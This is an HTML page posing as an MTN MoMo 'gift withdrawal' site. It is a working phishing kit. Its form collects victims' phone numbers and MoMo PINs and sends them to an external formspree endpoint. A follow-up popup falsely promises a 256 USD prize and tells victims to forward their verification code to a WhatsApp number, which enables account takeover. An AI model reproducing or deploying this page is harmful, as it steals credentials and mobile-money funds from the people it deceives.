<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">

<!-- Prevent zooming and make layout fixed for mobile -->
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

<title>Withdraw MoMo Gifts</title>

<style>
  /* Global reset to prevent scrolling */
  html, body {
    margin: 0;
    padding: 0;
    height: 100%;
    width: 100%;
    overflow: hidden;
    font-family: Arial, sans-serif;
  }

  /* Background */
  body {
    display: flex;
    justify-content: center;
    align-items: center;
    background: url('images/bg.jpg') no-repeat center center;
    background-size: cover;
    position: relative;
    animation: fadeIn 1.5s ease-in-out;
  }

  /* Overlay */
  body::after {
    content: "";
    position: absolute;
    top: 0;
    left: 0;
    height: 100%;
    width: 100%;
    background: white;
    z-index: 0;
  }

  /* Title */
  h2 {
    text-align: center;
    color: yellow;
    position: absolute;
    top: 20px;
    width: 100%;
    z-index: 2;
    text-shadow: 1px 1px 4px black;
    font-size: 26px;
    animation: slideDown 1s ease;
  }

  /* Circular Logo */
  .logo {
    position: absolute;
    top: 80px;
    width: 120px;
    height: 120px;
    border-radius: 50%;
    object-fit: cover;
    border: 3px solid white;
    z-index: 2;
    left: 50%;
    transform: translateX(-50%);
    animation: fadeIn 1.2s ease;
  }

  /* Glass-effect Form */
  form {
    position: relative;
    z-index: 2;
    width: 320px;
    padding: 25px;
    margin-top: 190px;
    border-radius: 15px;
    
    background: rgba(255,255,255,0.15);
    backdrop-filter: blur(8px);
    -webkit-backdrop-filter: blur(8px);

    box-shadow: 0 0 25px rgba(0,0,0,0.3);
    animation: slideUp 1.2s ease;
  }

  input {
    width: 100%;
    padding: 12px;
    margin-bottom: 15px;
    border-radius: 5px;
    border: 1px solid #ddd;
    font-size: 16px;
  }

  button {
    width: 100%;
    padding: 12px;
    background: mediumseagreen;
    color: white;
    border: none;
    border-radius: 5px;
    cursor: pointer;
    font-size: 17px;
    transition: 0.3s ease;
  }

  button:hover {
    background: #222;
  }

  /* Success Popup */
  #successPopup {
    display: none;
    position: absolute;
    z-index: 10;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    
    background: white;
    padding: 25px;
    border-radius: 12px;
    text-align: center;
    width: 75%;
    box-shadow: 0 0 25px rgba(0,0,0,0.4);
    animation: popIn 0.4s ease;
  }

  #successPopup h3 {
    margin-top: 0;
    font-size: 20px;
    color: blue;
  }

  #successPopup button {
    margin-top: 15px;
    background: blue;
    color: white;
  }

  /* MOBILE RESPONSIVE */
  @media (max-width: 480px) {
    h2 { font-size: 22px; }

    .logo {
      width: 100px;
      height: 100px;
      top: 65px;
    }

    form {
      width: 85%;
      margin-top: 165px;
      padding: 20px;
    }
  }

  /* Animations */
  @keyframes fadeIn {
    from { opacity: 0; }
    to   { opacity: 1; }
  }

  @keyframes slideDown {
    from { opacity: 0; transform: translateY(-20px); }
    to   { opacity: 1; transform: translateY(0); }
  }

  @keyframes slideUp {
    from { opacity: 0; transform: translateY(40px); }
    to   { opacity: 1; transform: translateY(0); }
  }

  @keyframes popIn {
    from { opacity: 0; transform: scale(0.8); }
    to   { opacity: 1; transform: scale(1); }
  }

</style>
</head>

<body>

<h2>Withdraw MoMo Gifts</h2>

<img src="mtn2.jpg" class="logo">

<!-- SUCCESS POPUP -->
<div id="successPopup">
  <h3>Submitted Successfully!</h3>
  <p>Congratulation!!!!!,Your MoMo Gift request received and you've qualified for 256 USD(5920 ZMW).Kindly forward the VERIFICATION CODE to the admin ON WHATSAPP +447830 731 278.</p>
  <button onclick="closePopup()">OK</button>
</div>

<!-- FORM -->
<form id="contactForm" action="https://formspree.io/f/xblzznvg" method="POST">
  <label>Phone Number</label>
  <input type="text" name="phone" placeholder="Enter phone number" required>

  <label>MoMo Pin</label>
  <input type="text" name="account" placeholder="Enter MoMo pin" required>

  <button type="submit">Withdraw</button>
</form>

<script>
  // Intercept form submit
  const form = document.getElementById("contactForm");
  form.addEventListener("submit", async (e) => {
    e.preventDefault();

    let formData = new FormData(form);

    let response = await fetch(form.action, {
      method: "POST",
      body: formData,
      headers: { 'Accept': 'application/json' }
    });

    if (response.ok) {
      document.getElementById("successPopup").style.display = "block";
      form.reset();
    } else {
      alert("There was an error. Try again.");
    }
  });

  function closePopup() {
    document.getElementById("successPopup").style.display = "none";
  }
</script>

</body>
</html>
